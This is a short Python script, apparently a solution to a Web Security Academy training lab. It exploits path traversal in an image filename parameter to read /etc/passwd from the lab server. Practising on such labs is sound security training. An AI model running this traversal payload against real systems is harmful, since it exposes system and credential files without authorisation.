import requests

DOMAIN = "0a0b00a004df059481156b2f00b60050.web-security-academy.net"

def get_file_content(path):
    payload = "/var/www/images/" + "../" * 5 + path
    response = requests.get(f"https://{DOMAIN}/image?filename={payload}")
    print(response.text)

get_file_content("/etc/passwd")